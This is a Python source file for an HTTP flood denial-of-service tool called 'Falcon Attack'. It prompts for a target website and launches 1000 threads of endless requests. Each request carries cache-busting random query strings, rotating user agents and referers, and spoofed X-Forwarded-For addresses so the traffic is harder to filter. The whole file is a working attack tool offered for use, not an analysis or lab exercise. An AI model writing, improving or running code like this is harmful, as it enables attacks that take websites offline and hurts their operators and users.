import urllib.request
import concurrent.futures
import random
import re
import sys,os
from colorama import Fore
import threading
import string
from halo import Halo
from logo import logo
from ipFake import random_ipFake
from Tools.userAgent import uagent
# -------------------------
global params
url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
safe = 0
__version__ = '8.0'
__author__ = "Al-Mohammady Team."
__method__ = 'HTTP'




def inc_counter():
    global request_counter
    request_counter += 1

def set_flag(val):
    global flag
    flag = val

def set_safe():
    global safe
    safe = 1

#Read data from file
def read_file(file_path, sample_size=2):
    with open(file_path, 'r') as file:
        data = file.readlines()
    return random.sample([item.strip() for item in data], sample_size)

 #generates a user agent array
def useragent_list():
    global headers_useragents
    headers_useragents = read_file('Tools/user_agent.txt')
    return headers_useragents

 #generates a referer array
def referer_list():
    global headers_referers
    headers_referers = read_file('Tools/referers.txt')
    return headers_referers

 #builds random ASCII string
def buildblock(size):
    return ''.join(random.choice(string.ascii_uppercase) for _ in range(size))

def usage():
    spinner = Halo()
    spinner.succeed(f'Method : {__method__}.')
    spinner.stop()
    print('-'*40)

 #http request
def httpcall(url):
    useragent_list()
    referer_list()
    code = 0
    if url.count("?") > 0:
        param_joiner = "&"
    else:
        param_joiner = "?"
    payload = buildblock(random.randint(0, 10)) + '=' + buildblock(random.randint(0,10))
    request_url = url + param_joiner + payload
    headers = {
        'User-Agent': random.choice(uagent),
        'Cache-Control': 'no-cache',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Referer': random.choice(referer_list()) + buildblock(random.randint(0, 10)),
        'Keep-Alive': str(random.randint(120, 130)),
        'Connection': 'keep-alive',
        'Host': host,
        'X-Forwarded-For': random_ipFake()
    }

    try:
        urllib.request.urlopen(urllib.request.Request(request_url, headers=headers))
    except urllib.error.HTTPError as e:
        set_flag(1)
        print(f"{Fore.RED}[ 500 ] {Fore.MAGENTA} Response Code !")
        code = 500
    except urllib.error.URLError as e:
        sys.exit()
    else:
        inc_counter()

    return code

 #http caller function
def http_caller(url):
    while flag < 2:
        code = httpcall(url)
        if code == 500 and safe == 1:
            pass

 #monitors http threads and counts requests
def monitor_thread():
    sent = 0
    previous = request_counter
    while flag == 0:
        if previous + 100 < request_counter and previous != request_counter:
            sent += 1
            print(f"{Fore.YELLOW}[ {sent} ] {Fore.GREEN}Request Sent! Payload Size : {Fore.YELLOW}{request_counter}.")
            previous = request_counter
    if flag == 2:
        print(f"\n{Fore.RED}-- Falcon Attack Finish --{Fore.RESET}")

 #execute
if __name__ == "__main__":
    os.system('clear')
    #print(random_ipFake())
    logo()
    usage()
    #print(random.choice(uagent))
    
    url = input(f"{Fore.YELLOW}[ ? ]{Fore.GREEN} Website Target  : ")

    if url.count("/") == 2:
        url = url + "/"

    m = re.search('(https?\://)?([^/]*)/?.*', url)
    host = m.group(2)

    safe_option = input(f"{Fore.YELLOW}[ ? ] {Fore.GREEN}Mode < safe > (yes / no) : ").lower()
    if safe_option == "yes":
        set_safe()

    # Using ThreadPoolExecutor to run multiple threads concurrently
    

    with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
        # Submitting HTTP call tasks to the executor
        
        future_to_url = {executor.submit(http_caller, url): url for _ in range(1000)}

        # Starting the monitor thread
        
        t = threading.Thread(target=monitor_thread)
        t.start()

        # Waiting for all tasks to complete
        for future in concurrent.futures.as_completed(future_to_url):
            future.result()

        # Waiting for the monitor thread to finish
        t.join()
        
